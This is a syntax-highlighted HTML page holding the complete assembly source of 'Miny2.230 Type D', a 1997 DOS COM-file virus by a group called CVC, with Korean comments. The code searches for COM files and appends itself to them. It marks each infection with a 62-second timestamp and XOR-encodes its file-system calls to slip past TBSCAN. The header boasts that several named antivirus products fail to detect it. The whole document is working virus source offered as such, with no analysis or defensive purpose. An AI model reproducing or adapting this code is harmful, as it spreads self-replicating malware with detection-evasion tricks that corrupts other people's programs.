<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MINY2D.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                               CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">; Virus Name : Miny2.230 Type D</span><span class="sc0">
</span><span class="sc1">; Author : Osiris</span><span class="sc0">
</span><span class="sc1">; Group : CVC</span><span class="sc0">
</span><span class="sc1">; Date : 1997/08/20</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Type : Non-resident COM infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Miny2 (Type C) 의 개선판이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; TBSCAN 의 인공지능 (훗~) 에 전혀 진단이 안된다. 단지 62초로 만들기 때문에 'T'</span><span class="sc0">
</span><span class="sc1">; 플래그만 방생한다. 그외 국내에서 많이 쓰이는 백신들에서는 검색이 전혀안된다.</span><span class="sc0">
</span><span class="sc1">; 단, 인공지능검색에는 진단이 된다. 이건 다음 버전에서 해결할 예정이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 이버전에서는 TBSCAN 에서 Howard 로 진단되던 문제점과</span><span class="sc0">
</span><span class="sc1">; TBSCAN 의 인공지능에 걸리던 문제가 해결되었다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; TBSCAN 의 F 플래그 '의심스러운 파일 억세스' 부분의 문제는</span><span class="sc0">
</span><span class="sc1">; 파일 관련 루틴들을 XOR 로 암호화 시켜서 따로 호출하게 만들었다.</span><span class="sc0">
</span><span class="sc1">; 여기서는 각 기능에 50h 로 XOR 연산을 시켜서 호출했다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : 진단 x</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 여전히 문제점이라면 한개의 COM 감염과 (감염속도느림) EXE 형식의 COM 파일을 만</span><span class="sc0">
</span><span class="sc1">; 났을때의 감염정지이다. 물론 시간을 62초로 만들므로 다음에는 그냥 통과한다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
            </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
            </span><span class="sc9">.CODE</span><span class="sc0">

 </span><span class="sc5">Miny2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 쓰레기값 (아무일도 안한다.)</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 앞부분 복구시 바이러스가 파괴되기</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 때문에 이 값을 넣었다.</span><span class="sc0">
 </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Next</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; nop 을 빼버리면 'Howard' 로 진단</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">        </span><span class="sc1">; BP = 바이러스 시작지점</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">COM_head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; COM 앞부분 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; DI 를 100h 로 잡아 버리면</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">; TBSCAN 에서 'O' 상태가 발생한다.</span><span class="sc0">
            </span><span class="sc6">movsw</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; DTA 로 사용해 PSP 가 파괴되므로</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; 잠시 저장한다.</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 파일 찾기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Match_COM</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">ChkInfected</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 원래 DTA 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">

 </span><span class="sc5">ChkInfected</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; 감염 여부를 확인한다.</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0096h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 62 초 인지 검사한다.</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">Infect</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find</span><span class="sc0">
 </span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">43h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                </span><span class="sc1">; 읽기/쓰기 속성으로 바꿈</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">               </span><span class="sc1">; 에러시 파일 닫기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                </span><span class="sc1">; 파일 오픈</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; 파일 핸들 얻기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">57h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 파일 작성 시간 얻기</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; 작성 시간 저장</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 앞부분 읽기</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 버퍼 주소</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">               </span><span class="sc1">; 3 바이트</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">; MZ 인가 ?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">lseek2</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc10">Error</span><span class="sc0">
 </span><span class="sc5">lseek2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                 </span><span class="sc1">; 파일 끝으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; 64 KB 이상인가 ?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc10">Error</span><span class="sc0">                 </span><span class="sc1">; 다음 검사때 오픈 시키지 않기위해서</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; 점프값 계산</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">int21</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                 </span><span class="sc1">; 처음으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 점프 코드 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">int21</span><span class="sc0">

 </span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; 파일 작성 시간 복구</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">               </span><span class="sc1">; 62 초로 만들기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">57h</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">

 </span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 파일 닫기</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Int21</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Restart</span><span class="sc0">

 </span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Int21</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; XOR 50h 연산후</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">                </span><span class="sc1">; 인터럽트 21h 호출</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">COM_head</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">; COM 앞부분</span><span class="sc0">
 </span><span class="sc5">Match_COM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'*.c?m'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">; COM 파일 찾기</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Miny2'</span><span class="sc0">               </span><span class="sc1">; 미니 2</span><span class="sc0">
 </span><span class="sc5">JumpCode</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0E9h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">END</span><span class="sc0">   </span><span class="sc5">Miny2</span><span class="sc0">

</span></div></body>
</html>
